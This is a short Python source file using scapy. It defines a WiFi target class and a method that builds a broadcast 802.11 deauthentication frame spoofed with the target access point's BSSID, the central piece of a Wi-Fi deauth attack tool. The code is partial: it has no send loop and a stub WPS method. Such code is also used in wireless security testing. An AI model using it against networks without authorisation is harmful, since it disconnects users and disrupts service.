from scapy.all import RadioTap,Dot11,Dot11Deauth
class WiFi:
    __id     : int = 1
    essid   : str = 'name'
    bssid   : str = 'ff:ff:ff:ff:ff:ff'
    channel : int = 1

    def __init__(self) -> None:
        self.__id: int = WiFi.get_next_id()

    @property
    def id(self) -> int:
        return self.__id

    @staticmethod
    def get_next_id() -> int:
        WiFi.id_counter = getattr(WiFi, 'id_counter', 0) + 1
        return WiFi.id_counter
    
    def wps_on()-> bool:
        pass

class Packet:
    def deauth(wifi:WiFi):
        radiotap = RadioTap(
        version=0,
        pad=0,
        len=13,
        present="Rate+TXFlags+b18",
        Rate=1.0,  # Mbps
        TXFlags="",
        notdecoded="\x00"
        )
        dot11 = Dot11(
            subtype=0xC,
            type=0,
            proto=0,
            FCfield="",
            ID=14849,
            addr1="ff:ff:ff:ff:ff:ff", 
            addr2=wifi.bssid,  
            addr3=wifi.bssid,  
            SC=13568 
        )
        deauth = Dot11Deauth(reason=7)
        packet = radiotap / dot11 / deauth
        return packet